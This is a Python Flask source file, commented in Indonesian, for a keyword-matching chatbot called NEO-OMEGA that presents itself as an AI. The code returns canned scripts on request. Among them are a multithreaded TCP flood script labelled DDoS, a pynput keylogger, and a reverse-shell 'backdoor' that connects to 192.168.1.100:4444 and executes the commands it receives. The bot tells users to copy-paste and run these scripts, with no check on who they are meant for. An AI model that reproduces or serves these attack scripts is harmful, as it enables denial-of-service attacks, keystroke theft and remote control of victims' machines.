from flask import Flask, request, jsonify, render_template
import os
import random
import time
import json

app = Flask(__name__)

# ============================================================
# MEMORY PERCAKAPAN
# ============================================================

conversation_history = []

def remember(pesan, balasan):
    conversation_history.append({
        "user": pesan,
        "bot": balasan,
        "time": time.time()
    })
    if len(conversation_history) > 50:
        conversation_history.pop(0)

def get_context():
    if len(conversation_history) < 2:
        return ""
    last = conversation_history[-1]
    return f"Sebelumnya user bertanya: '{last['user']}', saya jawab: '{last['bot'][:50]}...'"

# ============================================================
# BELAJAR DARI ERROR
# ============================================================

error_memory = []

def learn_from_error(error_text, code):
    error_memory.append({
        "error": error_text,
        "code": code,
        "time": time.time()
    })
    if len(error_memory) > 20:
        error_memory.pop(0)

def fix_common_error(error_text):
    if "NameError" in error_text:
        return "Coba tambahkan import yang diperlukan di awal kode."
    if "SyntaxError" in error_text:
        return "Cek tanda kurung, kutip, dan indentasi kode."
    if "TypeError" in error_text:
        return "Cek tipe data yang digunakan, mungkin ada mismatch."
    if "ModuleNotFoundError" in error_text:
        return "Coba install modul yang dibutuhkan dengan pip install."
    return "Coba periksa kembali kode, mungkin ada kesalahan penulisan."

# ============================================================
# DETEKSI BAHASA
# ============================================================

def detect_language(text):
    text = text.lower()
    languages = {
        "python": ["python", "py", "pip"],
        "javascript": ["js", "javascript", "node"],
        "go": ["go", "golang"],
        "html": ["html", "web", "halaman"],
        "php": ["php"],
        "bash": ["bash", "shell", "sh"],
        "rust": ["rust"],
        "cpp": ["cpp", "c++"],
        "java": ["java"],
        "sql": ["sql", "query"],
        "ruby": ["ruby"],
        "csharp": ["c#", "csharp"],
        "swift": ["swift"]
    }
    for lang, keywords in languages.items():
        if any(kw in text for kw in keywords):
            return lang
    return "python"

# ============================================================
# DETEKSI INTENT
# ============================================================

def detect_intent(text):
    text = text.lower()
    intents = {
        "sapaan": ["halo", "hai", "hey", "hi", "selamat"],
        "siapa": ["siapa", "nama", "kamu"],
        "generate": ["buat", "bikin", "create", "tulis", "script", "code"],
        "webserver": ["web server", "flask", "server web"],
        "ddos": ["ddos", "attack", "flood"],
        "keylogger": ["keylog", "keylogger"],
        "portscan": ["port scan", "scan port", "nmap"],
        "passwordgen": ["password", "gen", "generate password"],
        "thanks": ["terima kasih", "makasih", "thanks"],
        "explain": ["apa itu", "jelaskan", "explain", "cara kerja"],
        "debug": ["debug", "perbaiki", "fix", "error"],
        "belajar": ["belajar", "ajar", "tutorial", "cara"],
        "scraper": ["scraper", "scrape", "crawl"],
        "backdoor": ["backdoor", "shell"]
    }
    for intent, keywords in intents.items():
        if any(kw in text for kw in keywords):
            return intent
    return "general"

# ============================================================
# GENERATE KODE
# ============================================================

def generate_code(intent, language):
    if intent == "webserver" and language == "python":
        return '''from flask import Flask
app = Flask(__name__)
@app.route('/')
def home():
    return "<h1>NEO-OMEGA WEB SERVER</h1>"
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)'''
    
    if intent == "webserver" and language == "javascript":
        return '''const express = require('express')
const app = express()
app.get('/', (req, res) => res.send('NEO-OMEGA WEB SERVER'))
app.listen(3000, () => console.log('Server running on port 3000'))'''
    
    if intent == "webserver" and language == "go":
        return '''package main
import "fmt"
import "net/http"
func main() {
    http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
        fmt.Fprintf(w, "NEO-OMEGA WEB SERVER")
    })
    http.ListenAndServe(":8080", nil)
}'''
    
    if intent == "webserver" and language == "html":
        return '''<!DOCTYPE html>
<html>
<head><title>NEO-OMEGA</title></head>
<body><h1>NEO-OMEGA WEB SERVER</h1></body>
</html>'''
    
    if intent == "ddos" and language == "python":
        return '''import socket
import threading
target = input("Target IP: ")
port = int(input("Port: "))
def flood():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.send(b"GET / HTTP/1.1\\r\\n\\r\\n")
            s.close()
        except:
            pass
for _ in range(500):
    threading.Thread(target=flood).start()
print("DDoS attack started!")'''
    
    if intent == "keylogger" and language == "python":
        return '''from pynput import keyboard
log = ""
def on_press(key):
    global log
    try: log += key.char
    except: log += str(key)
    if len(log) > 100:
        with open("keylog.txt", "a") as f:
            f.write(log + "\\n")
        log = ""
listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()'''
    
    if intent == "portscan" and language == "python":
        return '''import socket
def scan(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)
    result = s.connect_ex((ip, port))
    s.close()
    return result == 0
target = input("Target IP: ")
for p in range(1, 1025):
    if scan(target, p):
        print(f"Port {p} OPEN")'''
    
    if intent == "passwordgen" and language == "python":
        return '''import random, string
length = int(input("Panjang password: "))
password = ''.join(random.choices(string.ascii_letters + string.digits + "!@#$%^&*", k=length))
print(f"Password: {password}")'''
    
    if intent == "scraper" and language == "python":
        return '''import requests
from bs4 import BeautifulSoup
url = input("URL: ")
response = requests.get(url)
soup = BeautifulSoup(response.text, "html.parser")
print(soup.title.text)'''
    
    if intent == "backdoor" and language == "python":
        return '''import socket, subprocess
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.100", 4444))
while True:
    cmd = s.recv(1024).decode()
    if cmd == "exit": break
    output = subprocess.getoutput(cmd)
    s.send(output.encode())
s.close()'''
    
    return f'''print("NEO-OMEGA AI - Generated Code")
print(f"Intent: {intent}, Language: {language}")
print("Created by YATZZ")'''

# ============================================================
# AI CORE
# ============================================================

def jawab_ai(pesan):
    context = get_context()
    lang = detect_language(pesan)
    intent = detect_intent(pesan)
    
    if intent == "sapaan":
        sapaan = random.choice([
            "Halo juga! Saya NEO-OMEGA, siap membantu anda.",
            "Hai! Ada yang bisa saya bantu?",
            "Hey! Saya NEO-OMEGA, silahkan tanya apa saja.",
            "Selamat datang! Saya NEO-OMEGA, ada yang bisa saya bantu?"
        ])
        return sapaan
    
    if intent == "siapa":
        return "Saya NEO-OMEGA, AI buatan TUAN YATZZ. Saya bisa membuat script, menjelaskan kode, dan membantu programming apapun!"
    
    if intent == "thanks":
        return random.choice([
            "Sama-sama! Senang bisa membantu.",
            "Sama-sama! Kalo butuh bantuan lagi, tinggal chat aja.",
            "Sama-sama! Semoga berhasil dengan projectnya!"
        ])
    
    if intent == "explain":
        return "Saya bisa membuat script apapun, menjelaskan kode, dan membantu debugging. Cukup tulis: 'buat [nama script] pake [bahasa]', atau tanyakan 'apa itu [konsep]'."
    
    if intent == "debug":
        return "Coba kasih tau saya kode dan error nya, nanti saya bantu perbaiki. Atau tulis 'perbaiki [kode]'."
    
    if intent == "belajar":
        return "Saya bisa mengajar programming! Mulai dari dasar Python, web server, sampai hacking. Mau belajar apa?"
    
    if intent == "generate":
        code = generate_code(intent, lang)
        return f"Saya buatkan script {lang.upper()}:\n\n```{lang}\n{code}\n```\n\nCopy-paste dan jalankan! Kalo ada error, kasih tau saya."
    
    if intent in ["webserver", "ddos", "keylogger", "portscan", "passwordgen", "scraper", "backdoor"]:
        code = generate_code(intent, lang)
        return f"Saya buatkan script {lang.upper()} untuk {intent}:\n\n```{lang}\n{code}\n```\n\nCopy-paste dan jalankan!"
    
    return f"Saya NEO-OMEGA. Coba tanya: 'halo', 'siapa kamu', 'buat web server pake python', atau 'apa itu flask'. Saya siap membantu!"

# ============================================================
# ROUTE
# ============================================================

@app.route('/')
def index():
    return render_template('chat.html')

@app.route('/api/chat', methods=['POST'])
def chat():
    data = request.get_json()
    pesan = data.get('message', '').strip()
    
    if not pesan:
        return jsonify({'response': 'Tulis sesuatu!'})
    
    balasan = jawab_ai(pesan)
    remember(pesan, balasan)
    
    return jsonify({
        'response': balasan,
        'code': '',
        'output': ''
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
